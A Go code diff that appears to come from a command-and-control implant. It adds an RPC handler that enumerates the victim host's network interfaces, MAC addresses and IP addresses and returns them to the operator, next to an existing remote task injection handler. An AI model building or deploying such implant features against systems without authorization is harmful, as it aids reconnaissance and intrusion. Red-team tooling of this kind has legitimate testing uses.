@@ -25,6 +25,7 @@ import (
 	"fmt"
 	"io"
 	"io/ioutil"
+	"net"
 
 	// {{if .Debug}}
 	"log"
@@ -352,6 +353,43 @@ func remoteTaskHandler(data []byte, resp RPCResponse) {
 	}
 	err = taskrunner.RemoteTask(int(remoteTask.Pid), remoteTask.Data)
 	resp([]byte{}, err)
+}
+
+func ifconfigHandler(_ []byte, resp RPCResponse) {
+	interfaces := ifconfig()
+	// {{if .Debug}}
+	log.Printf("network interfaces: %#v", interfaces)
+	// {{end}}
+	data, err := proto.Marshal(interfaces)
+	resp(data, err)
+}
+
+func ifconfig() *pb.Ifconfig {
+	netInterfaces, err := net.Interfaces()
+	if err != nil {
+		return nil
+	}
+
+	interfaces := &pb.Ifconfig{
+		NetInterfaces: []*pb.NetInterface{},
+	}
+	for _, iface := range netInterfaces {
+		netIface := &pb.NetInterface{
+			Index: int32(iface.Index),
+			Name:  iface.Name,
+		}
+		if iface.HardwareAddr != nil {
+			netIface.MAC = iface.HardwareAddr.String()
+		}
+		addresses, err := iface.Addrs()
+		if err == nil {
+			for _, address := range addresses {
+				netIface.IPAddresses = append(netIface.IPAddresses, address.String())
+			}
+		}
+		interfaces.NetInterfaces = append(interfaces.NetInterfaces, netIface)
+	}
+	return interfaces
 }
 
 // ---------------- Data Encoders ----------------
